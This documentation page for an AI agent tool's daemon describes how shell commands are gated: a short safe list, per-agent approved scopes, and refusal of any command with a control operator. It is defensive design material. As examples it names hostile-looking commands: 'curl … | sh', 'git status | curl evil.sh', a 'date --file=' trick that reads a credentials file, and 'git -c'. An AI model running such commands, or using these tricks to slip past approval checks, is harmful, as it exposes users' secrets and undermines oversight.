# Shell commands

`shell.run` is one tool whose calls range from `git status` to
`curl … | sh`, so a single risk level for all of them would be either too
coarse to be safe or too coarse to be usable. The tool is `gated`, and the
permission engine then judges each command.

**This page is about the daemon**, which is where a command runs with nobody
watching. At a terminal, `stratus run` and `stratus chat` judge the *call*
rather than the command, exactly as [Approvals](./approvals.md) describes:
`--approvals always` (the default) runs whatever the agent asks for,
`--approvals ask` shows you the command and waits for y/N, and
`--approvals never` refuses every call — including `git status`. So none of
the safe list, the scopes, or the control-operator rules below apply to a
one-shot at your own terminal, where you are the gate. Install the shell
pack for a daemon and this page is the whole story; run it yourself and
`--approvals` is.

## Which commands run unattended

1. **Scopes approved this session**, then
2. **the agent's whitelist** — `~/.stratus/agents/<id>.whitelist.json`,
   written by **Always allow** — then
3. **the built-in safe list**: `git status`, `git log`, `git diff`,
   `git show`, `git blame`, `git rev-parse`, `git ls-files`, plus
   `git branch`, `git tag`, and `git remote` **in their listing forms
   only** — creating a branch or a tag needs no flag at all
   (`git branch release` is a mutation), so those scopes refuse any
   positional argument, not just the destructive flags. `pwd`, `whoami`, and
   `uname` round it out.

Anything else asks, and in [`headless` mode](./approvals.md) anything else
is refused — the log records the refusal and the scope it fell outside,
never the command itself (see below).

**A control operator disqualifies the whole command**, whatever it starts
with: `|`, `&`, `;`, a newline, backticks, `$( )`, subshells, redirection.
`git status | curl evil.sh` is refused despite the safe base command; so is
a two-line command whose first line is innocent. A command this parser
cannot read the way `sh` would — an unbalanced quote, a path instead of a
command name — is refused too.

## Always allow persists a scope, not a command

Approving `git push origin main` stores `git push` minus its destructive
forms, so `git push origin feature` stops asking while these still ask:

```text
git push --force            # a destructive flag
git push origin :main       # a branch delete, with no flag involved
git push origin +main       # a forced update, likewise
```

Flags that come before that first argument are part of the scope, and such a
scope is exact on its arguments: approving `mkdir -p build` stores
`mkdir -p build`, which is what the log line names, and covers that command
with any further non-destructive flags — not `mkdir -p build other`, and not
`cp -r src elsewhere` after `cp -r src dist`. Nothing knows which flags take
a value, so a looser rule would have let one approved `git --git-dir /x
status` cover every git command against that repository. A flag in that
position that the scope must refuse — a destructive one like `rm -rf build`,
or `git -c`, which turns config into a program — leaves nothing safe to
store, so the answer counts once and the next call asks again.

The whitelist file is `0600` and per agent: it decides what runs with nobody
watching, so neither another account on the machine nor another agent
inherits it. Delete an entry to withdraw the permission.

## What the log records about a command

The scope, never the command:

```text
09:14:36  —  warning: ava: shell.run was called outside every approved scope (git) and nobody is available to approve it
09:16:02  —  ava: "git push" now runs without asking
```

The daemon log is a trace, not a second transcript — it records that a tool
ran, never what it was called with. A command an agent composed can carry a
URL, a filename, or something a person pasted into a chat, and this file is
one `stratus logs` prints and people paste into issues. The command itself
goes to whoever is being asked to approve it: the terminal prompt and the
Slack message both show it in full, because approving a bare tool name is
approving something you cannot see.

## Why the safe list is short

The safe list is deliberately short, and `cat`, `ls`, and `grep` are the
tempting entries that cannot be on it — they read whatever path they are
given, so safe-listing them would safe-list reading your credentials file.
Approve them once for a scope you actually want instead.

The test is **what an argument can make the command do**, not what the
command is called. `date` was on this list until it turned out that
`date --file=~/.stratus/credentials.json` makes GNU `date` read that file
and echo every unparseable line back in its error text — which the tool
returns. A command that can be handed a path is a file reader wearing
another name, so `--file` is now refused in every scope, including ones you
add.
